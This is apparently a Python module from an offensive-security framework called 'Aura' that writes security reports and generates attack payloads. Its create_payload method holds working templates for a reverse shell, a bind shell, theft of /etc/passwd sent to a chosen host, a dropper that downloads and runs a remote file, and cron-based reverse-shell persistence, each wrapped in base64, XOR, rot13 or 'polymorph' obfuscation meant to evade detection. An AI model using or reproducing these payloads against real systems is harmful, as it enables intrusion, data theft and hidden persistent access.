import os
import json
import datetime
import base64
from typing import List, Dict, Any, Optional
from utils.logger import Logger
from utils.sandbox import safe_executor

class FileExecutor:
    """
    Manages generation of reports, payloads, and safe script execution.
    All operations are confined to the /space directory.
    """
    def __init__(self, base_path: str = "space"):
        self.base_path = base_path
        self.payloads_path = os.path.join(self.base_path, "payloads")
        self.reports_path = os.path.join(self.base_path, "reports")
        self.scripts_path = os.path.join(self.base_path, "scripts")
        self.artifacts_path = os.path.join(self.base_path, "artifacts")
        self.max_usage = 500 * 1024 * 1024  # 500MB
        self.cleanup_threshold = 400 * 1024 * 1024  # 400MB

        for path in [self.payloads_path, self.reports_path, self.scripts_path, self.artifacts_path]:
            if not os.path.exists(path):
                os.makedirs(path)

    async def generate_report(self, findings: List[Dict[str, Any]], target: str = "target", format: str = "html") -> str:
        """
        Generates a security report based on findings.
        """
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"report_{target}_{timestamp}.{format}"
        report_path = os.path.join(self.reports_path, filename)

        try:
            if format == "json":
                content = json.dumps({"target": target, "findings": findings, "timestamp": timestamp}, indent=4)
            else:  # HTML default
                content = f"""
                <html>
                <head><title>Aura Security Report - {target}</title>
                <style>body{{font-family:sans-serif;margin:40px;}} .finding{{border:1px solid #ccc;padding:10px;margin-bottom:10px;}}
                .critical{{border-left:5px solid red;}} .high{{border-left:5px solid orange;}}</style>
                </head>
                <body><h1>Aura Framework Security Report</h1>
                <h2>Target: {target}</h2><p>Date: {timestamp}</p>
                """
                for f in findings:
                    severity = f.get("severity", "medium").lower()
                    content += f"<div class='finding {severity}'><h3>{f.get('title', 'Finding')}</h3>"
                    content += f"<p><b>Description:</b> {f.get('description', 'N/A')}</p>"
                    content += f"<p><b>Impact:</b> {f.get('impact', 'N/A')}</p></div>"
                content += "</body></html>"

            with open(report_path, "w") as f:
                f.write(content)

            Logger.success(f"Report generated: {report_path}")
            await self.cleanup_space()
            return report_path
        except Exception as e:
            Logger.error(f"Failed to generate report: {e}")
            return f"Error: {e}"

    async def create_payload(self, exploit_info: Dict[str, Any], payload_type: str = "reverse_shell", obfuscation: str = "base64") -> str:
        """
        Generates an obfuscated payload for security testing.
        """
        target_ip = exploit_info.get("target_ip", "0.0.0.0")
        target_port = exploit_info.get("target_port", 4444)

        # Payload templates
        payloads = {
            "reverse_shell": f"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{target_ip}',{target_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')",
            "bind_shell": f"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('0.0.0.0',{target_port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn('/bin/bash')",
            "data_exfil": f"import requests,os;data=open('/etc/passwd','r').read();requests.post('http://{target_ip}:{target_port}/exfil',data=data)",
            "dropper": f"import urllib.request,os;urllib.request.urlretrieve('http://{target_ip}:{target_port}/payload','/tmp/payload');os.chmod('/tmp/payload',0o755);os.system('/tmp/payload')",
            "persistence": f"import os;os.system('echo \"* * * * * /bin/bash -c \\'bash -i >& /dev/tcp/{target_ip}/{target_port} 0>&1\\'\" | crontab -')"
        }

        raw_payload = payloads.get(payload_type, payloads["reverse_shell"])

        # Obfuscation
        if obfuscation == "base64":
            encoded = base64.b64encode(raw_payload.encode()).decode()
            final_payload = f"import base64;exec(base64.b64decode('{encoded}'))"
        elif obfuscation == "xor":
            key = 0x42
            xored = "".join([chr(ord(c) ^ key) for c in raw_payload])
            encoded_xored = base64.b64encode(xored.encode()).decode()
            final_payload = f"import base64;exec(''.join([chr(ord(c)^{key}) for c in base64.b64decode('{encoded_xored}').decode()]))"
        elif obfuscation == "rot13":
            import codecs
            rotated = codecs.encode(raw_payload, 'rot_13')
            final_payload = f"import codecs;exec(codecs.decode('{rotated}', 'rot_13'))"
        elif obfuscation == "polymorph":
            # Very simple variable replacement polymorph example
            v1, v2, v3 = "sk_s", "sk_c", "sk_p"
            encoded = base64.b64encode(raw_payload.encode()).decode()
            final_payload = f"import base64 as {v1};{v2} = {v1}.b64decode('{encoded}');{v3} = {v2}.decode();exec({v3})"
        else:
            final_payload = raw_payload

        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"payload_{payload_type}_{timestamp}.py"
        payload_path = os.path.join(self.payloads_path, filename)

        try:
            with open(payload_path, "w") as f:
                f.write(f"# AURA FRAMEWORK - AUTHORIZED USE ONLY\n# Type: {payload_type} | Obfuscation: {obfuscation}\n" + final_payload)

            Logger.success(f"Payload created: {payload_path}")
            await self.cleanup_space()
            return payload_path
        except Exception as e:
            Logger.error(f"Failed to create payload: {e}")
            return f"Error: {e}"

    async def execute_script(self, script_path: str) -> Dict[str, Any]:
        """
        Executes a script safely in the sandbox.
        """
        # Ensure we are passing a relative path or a path from within space
        # safe_executor.validate_path will handle the security.
        return await safe_executor.execute(f"python3 {script_path}", script_path=script_path)

    async def cleanup_space(self):
        """
        Cleans up the /space directory to manage disk usage.
        """
        total_size = 0
        files = []
        for root, dirs, filenames in os.walk(self.base_path):
            for f in filenames:
                fp = os.path.join(root, f)
                size = os.path.getsize(fp)
                total_size += size
                files.append((fp, size, os.path.getmtime(fp)))

        if total_size > self.cleanup_threshold:
            Logger.warning(f"Disk usage in /space ({total_size/1024/1024:.2f}MB) exceeds threshold. Cleaning up...")
            # Sort by mtime (oldest first)
            files.sort(key=lambda x: x[2])

            deleted_size = 0
            for fp, size, _ in files:
                if total_size - deleted_size < self.cleanup_threshold * 0.8:
                    break
                try:
                    os.remove(fp)
                    deleted_size += size
                except Exception as e:
                    Logger.error(f"Failed to delete {fp}: {e}")
            Logger.info(f"Cleanup finished. Deleted {deleted_size/1024/1024:.2f}MB.")

# Global instance
file_executor = FileExecutor()
